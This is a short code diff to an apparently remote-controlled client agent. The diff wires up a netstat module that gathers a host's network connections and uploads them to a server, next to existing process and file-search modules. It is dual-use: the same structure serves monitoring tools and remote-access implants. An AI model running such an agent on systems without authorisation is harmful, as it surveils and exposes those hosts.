@@ -6,6 +6,7 @@ import logging
 from client.comms.HTTPWorker import HTTPWorker
 from client.modules.file import file_search
 from client.modules.process import process
+from client.modules.network import netstat
 
 """
 Command Format for File module:
@@ -94,10 +95,12 @@ class CommandHandler:
                     await http_worker.upload_results(command_id=cmd.cmd_id, payload=results)
             elif cmd.is_command('process'):
                 logger.info(f'Process module called with the following parameters: {cmd.parameters}')
-                results = await process.get_active_processes()
+                results = process.get_active_processes()
                 await http_worker.upload_results(command_id=cmd.cmd_id, payload=results)
             elif cmd.is_command('netstat'):
-                pass
+                logger.info(f'Netstat module called with the following parameters: {cmd.parameters}')
+                results = netstat.network_connections()
+                await http_worker.upload_results(command_id=cmd.cmd_id, payload=results)
             elif cmd.is_command('registry'):
                 print('Registry executed')
             elif cmd.is_command('service'):
